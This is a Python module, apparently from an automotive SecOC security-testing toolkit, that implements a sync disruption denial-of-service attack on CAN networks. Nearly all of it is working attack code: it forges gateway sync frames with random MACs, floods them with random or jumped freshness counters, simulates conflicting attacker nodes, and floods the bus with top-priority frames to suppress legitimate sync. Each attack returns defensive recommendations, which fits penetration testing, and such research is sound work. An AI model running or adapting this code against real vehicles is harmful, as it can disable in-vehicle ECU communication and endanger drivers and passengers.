#!/usr/bin/env python3
"""
Sync Disruption Attack - Replacement for Bus-Off Induction.

Concept Correction (BUG-6 Fix):
- OLD: Bus-Off attack tried to force Bus-Off by sending wrong CMAC (theoretically incorrect - 
       SecOC auth failure is application layer, doesn't cause CAN error frames)
- NEW: Sync Disruption attack floods forged sync frames (CGW1G01) to break freshness state

Attack Strategy:
1. Flood forged CGW1G01 frames with rapidly changing Trip/Reset counters
2. Target ECU's freshness manager gets confused about current counter values
3. Subsequent legitimate SecOC frames fail freshness validation
4. ECU may drop valid messages or enter error recovery state

This is a practical DoS attack that exploits the freshness synchronization mechanism.

Usage:
    from secoc_toolkit.attacks.sync_disruption import SyncDisruptionAttack
    
    attack = SyncDisruptionAttack(engine, fm, can_driver)
    result = attack.execute(msg_id=0x3BF, duration=5.0, rate=100)
"""

import time
import random
import logging
from typing import Dict, Optional
from dataclasses import dataclass

from ..core.secoc_engine import SecOCEngine
from ..core.freshness_manager import FreshnessManager
from ..can_drivers.can_interface import CANMessage, CANDriverInterface

logger = logging.getLogger(__name__)


@dataclass
class DisruptionResult:
    """Sync disruption attack result."""
    attack_name: str
    success: bool
    details: Dict
    duration: float
    risk_level: str
    recommendations: list


class SyncDisruptionAttack:
    """
    Sync Disruption Attack - Floods forged sync frames to break SecOC validation.
    
    Attack Vectors:
    1. Rapid Sync Flood: High-rate forged sync frames with random counters
    2. Counter Jump: Single sync frame with future counter values
    3. Sync Suppression: Block legitimate sync frames from reaching target
    4. Conflicting Sync: Two attack nodes send sync frames with different counters
    
    Expected Impact:
    - Target ECU's freshness counters become desynchronized
    - Legitimate SecOC frames fail freshness validation (0x03 != expected)
    - ECU may enter degraded mode or drop messages
    - TripCounter/ResetCounter monotonicity checks may trigger errors
    """
    
    def __init__(self, engine: SecOCEngine, freshness: FreshnessManager,
                 can_driver: CANDriverInterface):
        self.engine = engine
        self.freshness = freshness
        self.can_driver = can_driver
    
    def _build_sync_frame(self, trip_counter: int, reset_counter: int) -> bytes:
        """Build a forged CGW1G01-style sync frame."""
        # CGW1G01 payload structure:
        # Byte 0-1: TripCounter (16-bit, big endian)
        # Byte 2-4: ResetCounter (20-bit) + padding
        # Byte 5-7: Sync frame CMAC (28-bit, truncated)
        
        frame = bytearray(8)
        
        # TripCounter (16-bit BE)
        frame[0] = (trip_counter >> 8) & 0xFF
        frame[1] = trip_counter & 0xFF
        
        # ResetCounter (20-bit)
        frame[2] = (reset_counter >> 12) & 0xFF
        frame[3] = (reset_counter >> 4) & 0xFF
        frame[4] = ((reset_counter & 0x0F) << 4)
        
        # Fake CMAC (random - we don't have sync frame key)
        fake_cmac = random.randint(0, 0x0FFFFFFF)
        frame[4] |= (fake_cmac >> 24) & 0x0F
        frame[5] = (fake_cmac >> 16) & 0xFF
        frame[6] = (fake_cmac >> 8) & 0xFF
        frame[7] = fake_cmac & 0xFF
        
        return bytes(frame)
    
    def rapid_sync_flood(self, msg_id: int = 0x00F, duration: float = 5.0,
                         rate: float = 100, strategy: str = 'random') -> DisruptionResult:
        """
        Attack Vector 1: Rapid Sync Flood.
        
        Floods forged sync frames at high rate with rapidly changing counters.
        Target ECU can't distinguish legitimate from forged sync frames.
        
        Args:
            msg_id: Sync frame CAN ID (default: 0x00F for CGW1G01)
            duration: Attack duration in seconds
            rate: Frames per second
            strategy: Counter strategy ('random', 'increment', 'decrement', 'jump')
            
        Returns:
            DisruptionResult
        """
        start_time = time.time()
        count = 0
        
        # Determine initial counter values based on strategy
        if strategy == 'random':
            trip = random.randint(0, 0xFFFF)
            reset = random.randint(0, 0xFFFFF)
        elif strategy == 'increment':
            trip = self.freshness.trip_counter + 1
            reset = self.freshness.reset_counter + 1
        elif strategy == 'decrement':
            trip = max(0, self.freshness.trip_counter - 1)
            reset = max(0, self.freshness.reset_counter - 1)
        elif strategy == 'jump':
            trip = self.freshness.trip_counter + 10  # Jump ahead
            reset = 0
        else:
            trip = 0
            reset = 0
        
        while time.time() - start_time < duration:
            # Update counters based on strategy
            if strategy == 'random':
                trip = random.randint(0, 0xFFFF)
                reset = random.randint(0, 0xFFFFF)
            elif strategy == 'increment':
                reset += 1
                if reset > 0xFFFFF:
                    reset = 0
                    trip = (trip + 1) & 0xFFFF
            elif strategy == 'decrement':
                reset = max(0, reset - 1)
            elif strategy == 'jump':
                # Keep same jump values
                pass
            
            # Build and send forged sync frame
            sync_data = self._build_sync_frame(trip, reset)
            msg = CANMessage(arbitration_id=msg_id, data=sync_data)
            
            if self.can_driver.send(msg):
                count += 1
            
            # Maintain rate
            time.sleep(1.0 / rate)
        
        actual_duration = time.time() - start_time
        
        return DisruptionResult(
            attack_name='Sync Disruption - Rapid Flood',
            success=count > 0,
            details={
                'frames_sent': count,
                'duration': actual_duration,
                'rate': rate,
                'strategy': strategy,
                'target_msg_id': f'0x{msg_id:03X}',
                'final_trip': trip,
                'final_reset': reset,
                'impact': 'Target ECU freshness counters desynchronized'
            },
            duration=actual_duration,
            risk_level='HIGH',
            recommendations=[
                'Implement sync frame authentication (CMAC on sync frames)',
                'Use secure channels for sync frame transmission',
                'Add rate limiting for sync frame acceptance',
                'Implement sync frame source verification (gateway whitelist)',
                'Monitor for abnormal sync frame patterns'
            ]
        )
    
    def counter_jump_attack(self, msg_id: int = 0x00F,
                            trip_jump: int = 10, reset_value: int = 0) -> DisruptionResult:
        """
        Attack Vector 2: Counter Jump.
        
        Sends a single sync frame with significantly advanced counters.
        Target ECU accepts the jump and rejects all subsequent legitimate frames.
        
        Args:
            msg_id: Sync frame CAN ID
            trip_jump: TripCounter jump value
            reset_value: New ResetCounter value
            
        Returns:
            DisruptionResult
        """
        start_time = time.time()
        
        # Calculate future counter values
        future_trip = (self.freshness.trip_counter + trip_jump) & 0xFFFF
        future_reset = reset_value & 0xFFFFF
        
        # Build forged sync frame
        sync_data = self._build_sync_frame(future_trip, future_reset)
        msg = CANMessage(arbitration_id=msg_id, data=sync_data)
        
        sent = self.can_driver.send(msg)
        
        duration = time.time() - start_time
        
        return DisruptionResult(
            attack_name='Sync Disruption - Counter Jump',
            success=sent,
            details={
                'original_trip': self.freshness.trip_counter,
                'original_reset': self.freshness.reset_counter,
                'injected_trip': future_trip,
                'injected_reset': future_reset,
                'trip_jump': trip_jump,
                'impact': 'Target ECU jumps ahead, rejects legitimate frames with lower counters'
            },
            duration=duration,
            risk_level='CRITICAL',
            recommendations=[
                'Reject sync frames with large TripCounter jumps (>1)',
                'Validate ResetCounter monotonicity within Trip',
                'Require authentication on sync frames',
                'Implement maximum acceptable counter difference'
            ]
        )
    
    def conflicting_sync_attack(self, msg_id: int = 0x00F,
                                 num_attackers: int = 2,
                                 duration: float = 3.0) -> DisruptionResult:
        """
        Attack Vector 3: Conflicting Sync.
        
        Simulates multiple compromised nodes sending sync frames with different counters.
        Target ECU can't determine which sync frame is legitimate.
        
        Args:
            msg_id: Sync frame CAN ID
            num_attackers: Number of simulated attackers
            duration: Attack duration
            
        Returns:
            DisruptionResult
        """
        start_time = time.time()
        count = 0
        
        # Each attacker uses different counter progression
        attacker_counters = []
        for i in range(num_attackers):
            attacker_counters.append({
                'trip': self.freshness.trip_counter + i,
                'reset': self.freshness.reset_counter + i * 10,
                'direction': 1 if i % 2 == 0 else -1
            })
        
        while time.time() - start_time < duration:
            for attacker in attacker_counters:
                # Update this attacker's counters
                attacker['reset'] += attacker['direction']
                if attacker['reset'] > 0xFFFFF or attacker['reset'] < 0:
                    attacker['direction'] *= -1
                    attacker['reset'] = max(0, min(0xFFFFF, attacker['reset']))
                
                # Build and send sync frame
                sync_data = self._build_sync_frame(attacker['trip'], attacker['reset'])
                msg = CANMessage(arbitration_id=msg_id, data=sync_data)
                
                if self.can_driver.send(msg):
                    count += 1
                
                time.sleep(0.01)  # 10ms between attackers
        
        actual_duration = time.time() - start_time
        
        return DisruptionResult(
            attack_name='Sync Disruption - Conflicting Sync',
            success=count > 0,
            details={
                'frames_sent': count,
                'duration': actual_duration,
                'num_attackers': num_attackers,
                'impact': 'Target ECU receives conflicting sync frames, state inconsistent'
            },
            duration=actual_duration,
            risk_level='HIGH',
            recommendations=[
                'Implement sync frame source authentication',
                'Use single gateway for sync frame generation',
                'Add sync frame sequence numbers',
                'Monitor for multiple sync sources on same ID'
            ]
        )
    
    def sync_suppression_attack(self, msg_id: int = 0x00F,
                                 duration: float = 5.0) -> DisruptionResult:
        """
        Attack Vector 4: Sync Suppression (requires bus access).
        
        Attempts to suppress legitimate sync frames by flooding the bus.
        Target ECU doesn't receive sync and uses stale counters.
        
        Note: This requires being on the same CAN bus as the gateway.
        
        Args:
            msg_id: Sync frame CAN ID
            duration: Attack duration
            
        Returns:
            DisruptionResult
        """
        start_time = time.time()
        count = 0
        
        # Flood bus with high-priority frames (lower CAN ID = higher priority)
        # Use ID 0x000 (highest priority) to suppress sync frame (0x00F)
        flood_id = 0x000
        flood_data = b'\xFF' * 8
        
        while time.time() - start_time < duration:
            msg = CANMessage(arbitration_id=flood_id, data=flood_data)
            if self.can_driver.send(msg):
                count += 1
            time.sleep(0.001)  # 1ms = 1000 fps
        
        actual_duration = time.time() - start_time
        
        return DisruptionResult(
            attack_name='Sync Disruption - Bus Suppression',
            success=count > 0,
            details={
                'frames_sent': count,
                'duration': actual_duration,
                'flood_id': f'0x{flood_id:03X}',
                'target_id': f'0x{msg_id:03X}',
                'impact': 'Legitimate sync frames suppressed by bus flooding'
            },
            duration=actual_duration,
            risk_level='MEDIUM',
            recommendations=[
                'Implement CAN bus monitoring for flooding detection',
                'Use time-based freshness (independent of sync frames)',
                'Add redundant sync channels',
                'Implement bus load monitoring and alerting'
            ]
        )
    
    def execute(self, msg_id: int = 0x3BF, duration: float = 5.0,
                rate: float = 100, vector: str = 'rapid_flood') -> DisruptionResult:
        """
        Execute sync disruption attack with selected vector.
        
        Args:
            msg_id: CAN message ID (used for sync suppression, sync frame ID is 0x00F)
            duration: Attack duration
            rate: Attack rate (fps)
            vector: Attack vector ('rapid_flood', 'counter_jump', 'conflicting_sync', 'suppression')
            
        Returns:
            DisruptionResult
        """
        if vector == 'rapid_flood':
            return self.rapid_sync_flood(msg_id=0x00F, duration=duration, rate=rate)
        elif vector == 'counter_jump':
            return self.counter_jump_attack(msg_id=0x00F)
        elif vector == 'conflicting_sync':
            return self.conflicting_sync_attack(msg_id=0x00F, duration=duration)
        elif vector == 'suppression':
            return self.sync_suppression_attack(msg_id=0x00F, duration=duration)
        else:
            return DisruptionResult(
                attack_name='Sync Disruption - Unknown Vector',
                success=False,
                details={'error': f'Unknown vector: {vector}'},
                duration=0,
                risk_level='LOW',
                recommendations=[]
            )
    
    @staticmethod
    def get_available_vectors() -> list:
        """Get list of available attack vectors."""
        return [
            'rapid_flood - High-rate forged sync frames',
            'counter_jump - Single sync frame with advanced counters',
            'conflicting_sync - Multiple attackers with different counters',
            'suppression - Bus flooding to suppress legitimate sync'
        ]


# Replace Bus-Off attack in attack_modules.py
# Add to SecOCAttacks class:
# 
# from .sync_disruption import SyncDisruptionAttack
# 
# def sync_disruption(self, msg_id: int, duration: float = 5.0, 
#                     rate: float = 100, vector: str = 'rapid_flood') -> AttackResult:
#     """Sync Disruption Attack - replaces Bus-Off Induction."""
#     attack = SyncDisruptionAttack(self.engine, self.freshness, self.can_driver)
#     result = attack.execute(msg_id, duration, rate, vector)
#     
#     # Convert DisruptionResult to AttackResult
#     return AttackResult(
#         attack_name=result.attack_name,
#         success=result.success,
#         details=result.details,
#         duration=result.duration,
#         risk_level=result.risk_level,
#         recommendations=result.recommendations
#     )


if __name__ == '__main__':
    import logging
    logging.basicConfig(level=logging.INFO)
    
    print("Sync Disruption Attack Module")
    print("Available attack vectors:")
    for vector in SyncDisruptionAttack.get_available_vectors():
        print(f"  - {vector}")
    print("\nThis module replaces the Bus-Off Induction attack (BUG-6 Fix)")
    print("Bus-Off attack was theoretically incorrect - SecOC auth failures")
    print("don't cause CAN error frames. Sync disruption is a practical alternative.")
